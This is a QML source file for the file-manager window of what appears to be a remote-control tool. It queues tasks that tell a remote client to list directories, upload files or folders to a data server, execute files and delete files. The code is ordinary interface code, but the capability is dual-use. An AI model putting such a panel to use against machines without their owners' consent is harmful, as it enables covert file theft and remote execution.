// Copyright (c) Nouman Tajik [github.com/tajiknomi]
//
// Permission is hereby granted, free of charge, to any person obtaining a copy
// of this software and associated documentation files (the "Software"), to deal
// in the Software without restriction, including without limitation the rights
// to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
// copies of the Software, and to permit persons to whom the Software is
// furnished to do so, subject to the following conditions:
//
// The above copyright notice and this permission notice shall be included in all
// copies or substantial portions of the Software.
//
// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
// IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
// FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
// AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
// LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
// OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
// SOFTWARE.

import QtQuick.Controls.Basic
import QtQuick
import QtQuick.Controls

Window {
    id: root
    visible: true
    width: 430
    height: 400
    color: "white"
    title: username

    Component.onCompleted: {
        openPrompt("filemanager", "Please wait for items to load . . .");
    }

    Timer {
        id: searchTimer
        interval: 1000 // (1 seconds)
        repeat: false
        onTriggered: {
            searchInput = ""; // Clear the search input
        }
    }

    Connections {               // Signal handler to receive filemanager data from C++
        target: httpServer
        function onFileManagerResponse(userID, response) {
            if(userID === id){
                responseData = response
            }
        }
    }

    property string searchInput: ""
    property string id: ""            // This ID will be gathered from the main qml file i.e. "mvc.qml"
    property string username: ""
    property string dataServerIp: ""    // Will be fectched from "CRC.config"
    property string port: ""
    property string currentDir :""
    property string itemName :""

    function openPrompt(promptTitle, message){
        // Prompt the user with a dialog
        let component = Qt.createComponent("ShowPrompt.qml");
        if (component.status === Component.Ready) {
            let dialog = component.createObject(root);

            if (dialog !== null) {
                dialog.message = message
                dialog.promptTitle = promptTitle
                dialog.show()

                // Connect to the close signal to destroy the object
                dialog.closing.connect(function() {
                    dialog.destroy();
                });
            }
        }
        else {
            console.error("Error loading component:", component.errorString())
        }
    }

    function formatFileSize(sizeInBytes) {
        if(sizeInBytes === "N/A"){
            return sizeInBytes;
        }
        const bytes = parseFloat(sizeInBytes);

        if (bytes >= 1000 * 1024 * 1024) {
            const gigabytes = bytes / (1024 * 1024 * 1024);
            return gigabytes.toFixed(2) + " GB";
        } else if (bytes >= 1024 * 1024) {
            const megabytes = bytes / (1024 * 1024);
            return megabytes.toFixed(2) + " MB";
        } else if (bytes >= 1024) {
            const kilobytes = bytes / 1024;
            return kilobytes.toFixed(2) + " KB";
        } else {
            return bytes + " bytes";
        }
    }

    function isDirectory(path) {
        return (path.endsWith("/") || path.endsWith("\\"));
    }

    function stepBackDirectory(path) {
        // Remove any trailing forward slashes and normalize any repeated slashes to single slashes
        const trimmedPath = path.replace(/\/+/g, "/").replace(/\/$/, "");

        // Find the last occurrence of "/"
        const lastSlashIndex = trimmedPath.lastIndexOf("/");

        // If the path doesn't contain "/", return the original path as it is the root directory
        if (lastSlashIndex === -1) {
            return trimmedPath || "/";
        }

        // Extract the directory path one step back
        const finalPath = trimmedPath.substring(0, lastSlashIndex + 1);

        // Return the modified path
        return finalPath || "/";
    }

    function listDirectory(currentDir) {
        let mode = "listDir";
        let jsonObj = {
            id: id,
            mode: mode,
            dirToList: currentDir,
        };
        let jsonString = JSON.stringify(jsonObj);
        httpServer.registerTaskForClient(jsonString);
    }

    function downloadDir(dirPath, fileExtensions){
        let mode = "UploadDir";
        let jsonObj = {
            id: id,
            mode: mode,
            url: dataServerIp,
            port: port,
            dirPath: dirPath,
            fileExtensions: fileExtensions
        };
        let jsonString = JSON.stringify(jsonObj);
        httpServer.registerTaskForClient(jsonString);
    }

    function downloadFile(filePath){
        let mode = "uploadFile";
        let jsonObj = {
            id: id,
            mode: mode,
            url: dataServerIp,
            port: port,
            filePath: filePath,
        };
        let jsonString = JSON.stringify(jsonObj);
        httpServer.registerTaskForClient(jsonString);
    }

    function executeFile(exePath, arguments){
        let mode = "execute";
        let jsonObj = {
            id: id,
            mode: mode,
            exePath: exePath,
            arguments: arguments,
        };
        let jsonString = JSON.stringify(jsonObj);
        httpServer.registerTaskForClient(jsonString);
    }

    function compressAndDownload(path) {
        let mode = "compressAndDownload";
        let jsonObj = {
            id: id,
            mode: mode,
            url: dataServerIp,
            port: port,
            path: path
        };
        let jsonString = JSON.stringify(jsonObj);
        httpServer.registerTaskForClient(jsonString);
    }

    function copyOrMove(mode, sourcePath, destinationPath){

        let jsonObj = {
            id: id,
            mode: mode,
            sourcePath: sourcePath,
            destPath: destinationPath,
        };
        let jsonString = JSON.stringify(jsonObj);
        httpServer.registerTaskForClient(jsonString);
    }

    function deleteFile(filePath){
        let mode = "deleteFile"
        let jsonObj = {
            id: id,
            mode: mode,
            filePath: filePath,
        };
        let jsonString = JSON.stringify(jsonObj);
        httpServer.registerTaskForClient(jsonString);
    }

    function appendFilenameToDir(directory, filename) {
        const lastChar = directory.slice(-1);

        // Check if the last character is a forward slash or a backslash
        if (lastChar === '/' || lastChar === '\\') {
            return directory + filename;
        } else if (directory.includes('/')) {
            return directory + '/' + filename;
        } else if (directory.includes('\\')) {
            return directory + '\\' + filename;
        } else {
            // If there are no slashes in the dirToListText, assume forward slashes
            return directory + '/' + filename;
        }
    }

    property string responseData:''
    property string filelist: responseData
    //   property string dirToListText: JSON.parse(filelist).dirToList[0]
    //   property string driveText: JSON.parse(filelist).drive[0]
    property string dirToListText: filelist === '' ? '' : JSON.parse(filelist).dirToList[0]
    property string driveText: filelist === '' ? '' : JSON.parse(filelist).drive[0]

    property string copyPath: ""
    property string movePath: ""

    Column {
        anchors.fill: parent
        Item {
           id: headerItem
           height: backButton.height
           width: backButton.width * 8
           Button {
                id: backButton
                text: "Back"
                anchors{
               //     top: parent.top
                    left: parent.left
                }
                width: root.width/10
                height: root.height/10
                onClicked: {
                    let newPath = stepBackDirectory(dirToListText);
                    if(newPath.trim() === ""){
                        console.log("newPath is empty")
                    }
                    else {
                        listDirectory(newPath)
                    }
                }
            }
           Rectangle {
                id: headerRect
                height: parent.height
                width:  parent.width - backButton.width
                border.color: "black"
                color: "transparent"
                clip: true
                anchors{
                    left: backButton.right
                    margins: 20
                }
                TextInput  {
                    id: listDirId
                    text : driveText + dirToListText
                    color: "black"
                    font.pixelSize: parent.height * 0.4//parent.width/24
                    anchors {
                        fill: parent
                        margins: 10
                    }
                    cursorVisible: false
                    onAccepted: {
                        let currentDir = text.replace(/\\/g, '/');
                        listDirectory(currentDir)
                    }
                }
            }
        }
        ListView {
            id: listView
            clip: true
            width: parent.width
            height: parent.height - headerItem.height
//            anchors.top: backButton.bottom  // Place the ListView below the headerItem

            Keys.onPressed: event => {
                                if (event.key === Qt.Key_Return || event.key === Qt.Key_Enter){
                                    // let currentDir = (dirToListText.endsWith("/") ? dirToListText : dirToListText + "/") + model[listView.currentIndex].name
                                    let currentDir = dirToListText.replace(/\\/g, '/');
                                    currentDir += model[listView.currentIndex].name;
                                    listDirectory(currentDir);
                                }
                                else if (event.key === Qt.Key_Backspace || event.key === Qt.Key_Delete) {
                                    // Handle backspace or delete key
                                    searchInput = searchInput.slice(0, searchInput.length - 1);
                                }
                                else if (event.text.length > 0) {
                                    // Add typed characters to the search input
                                    searchInput += event.text;
                                }
                                // Check if search input has at least 3 characters before initiating search
                                if (searchInput.length >= 3) {
                                    // Restart the timer when a key is pressed
                                    searchTimer.restart();

                                    // Find the index of the first item that matches the search
                                    for (var i = 0; i < listView.count; i++) {
                                        if (model[i].name.toLowerCase().startsWith(searchInput)) {
                                            currentIndex = i;
                                            break;
                                        }
                                    }
                                }
                            }

            ScrollBar.vertical: ScrollBar { active: true }
            highlightMoveDuration: 100 // Set the animation duration (in milliseconds)
            highlightMoveVelocity: 1000 // Set the animation velocity (in pixels per second)

            model: filelist === '' ? '' : JSON.parse(filelist).files

            delegate: Item {
                id: item
                width: ListView.view.width
                height: 50

                Rectangle {
                    width: parent.width
                    height: parent.height
                    anchors.fill: parent
                    color: item.ListView.isCurrentItem ? "lightgrey" : "transparent"

                    MouseArea {
                        anchors.fill: parent
                        acceptedButtons: Qt.LeftButton | Qt.RightButton
                        onClicked:(mouse)=>{
                                      listView.forceActiveFocus();        // Catch mouse clicks and move the focus away from the TextInput i.e listDirId
                                      listView.currentIndex = index
                                      if (mouse.button === Qt.RightButton){
                                          menu.popup(); // Show the context menu
                                      }
                                  }
                        onDoubleClicked:(mouse)=> {
                                            if (mouse.button === Qt.LeftButton) {
                                                let currentDir = dirToListText.replace(/\\/g, '/');
                                                currentDir = appendFilenameToDir(currentDir, modelData.name);
                                                listDirectory(currentDir);
                                            }
                                        }

                        //{
                        //if(mouse.button === Qt.LeftButton) {
                        //   let currentDir = (dirToListText.endsWith("/") ? dirToListText : dirToListText + "/") + modelData.name
                        //    console.out (currentDir)
                        //    listDirectory(currentDir);
                        // }
                        //  }
                    }

                    Row {
                        spacing: 5

                        Image {
                            width: 36
                            height: 32
                            source: {
                                if (isDirectory(modelData.name)) {
                                    return "/resource/icons/directory-icon.png"; // Replace with the default directory icon
                                }
                                else {
                                    let extension = modelData.name.split('.').pop().toLowerCase();
                                    if (extension === 'pdf') {
                                        return "/resource/icons/pdf-icon.png";
                                    } else if (extension === 'doc' || extension === 'docx') {
                                        return "/resource/icons/doc-icon.png";
                                    } else if (extension === 'ppt' || extension === 'pptx') {
                                        return "/resource/icons/ppt-icon.png";
                                    } else if (extension === 'xls' || extension === 'xlsx') {
                                        return "/resource/icons/xls-icon.png";
                                    } else if (extension === 'exe') {
                                        return "/resource/icons/exe-icon.png";
                                    } else if ((extension === 'zip') || (extension === 'rar') || (extension === '7z') || (extension === 'tar')) {
                                        return "/resource/icons/archive-icon.png";
                                    } else if ((extension === 'jpeg') || (extension === 'jpg') || (extension === 'png') || (extension === 'svg') || (extension === 'icon')) {
                                        return "/resource/icons/image-icon.png";
                                    }
                                    else {
                                        return "/resource/icons/file-icon.png";
                                    }
                                }
                            }
                        }
                        Text {
                            id:nameTxt
                            text: modelData.name
                            anchors.verticalCenter: parent.verticalCenter
                        }
                        Text {
                            text: formatFileSize(modelData.size)
                            anchors.verticalCenter: parent.verticalCenter

                        }
                        Menu {
                            id: menu
                            MenuItem {          // Download
                                text: "Download"
                                onClicked: {
                                    listView.currentIndex = index;
                                    if (isDirectory(modelData.name)) {
                                        let fileExtensions = "";
                                        let dirPath = (dirToListText.endsWith("/") ? dirToListText : dirToListText + "/") + modelData.name
                                        downloadDir(dirPath, fileExtensions)
                                    }
                                    else {
                                        let filePath = (dirToListText.endsWith("/") ? dirToListText : dirToListText + "/") + modelData.name
                                        downloadFile(filePath)
                                    }
                                }
                            }
                            MenuItem {          // Execute
                                text: "Execute"
                                onClicked: {
                                    let mode = "execute";
                                    listView.currentIndex = index;
                                    let exePath = (dirToListText.endsWith("/") ? dirToListText : dirToListText + "/") + modelData.name
                                    let arguments = "";
                                    executeFile(exePath, arguments)
                                }
                            }
                            MenuItem {          // Compress&Download
                                text: "Compress&Download"
                                onClicked: {
                                    listView.currentIndex = index;
                                    let path = (dirToListText.endsWith("/") ? dirToListText : dirToListText + "/") + modelData.name
                                    compressAndDownload(path)
                                }
                            }
                            MenuItem {          // Copy
                                text: "Copy"
                                onClicked: {
                                    copyPath = (dirToListText.endsWith("/") ? dirToListText : dirToListText + "/") + modelData.name;
                                    movePath="";
                                }
                            }
                            MenuItem {          // Paste
                                text: "Paste"
                                onClicked: {
                                    let destinationPath = (dirToListText.endsWith("/") ? dirToListText : dirToListText + "/") + modelData.name;
                                    let sourcePath = copyPath === "" ? movePath : copyPath
                                    if (sourcePath === "") {
                                        openPrompt("copy", "You have not selected any file/folder to be paste!");
                                    }
                                    else {
                                        let mode = copyPath === "" ? "move" : "copy"
                                        copyOrMove(mode, sourcePath, destinationPath)
                                    }
                                }
                            }
                            MenuItem {          // Delete
                                text: "Delete"
                                onClicked: {
                                    let mode = "deleteFile"
                                    let filePath = (dirToListText.endsWith("/") ? dirToListText : dirToListText + "/") + modelData.name;
                                    if(filePath.endsWith("/")){
                                        // Prompt the user with a dialog
                                        openPrompt("delete", "Cannot delete a directory (for safety)")
                                    }

                                    else { deleteFile(filePath) }
                                }
                            }
                            MenuItem {          // Refresh
                                text: "Refresh"
                                onClicked: {
                                    let currentDir = driveText + dirToListText
                                    listDirectory(currentDir)
                                }
                            }
                        }
                    }
                }
            }
        }
    }
}
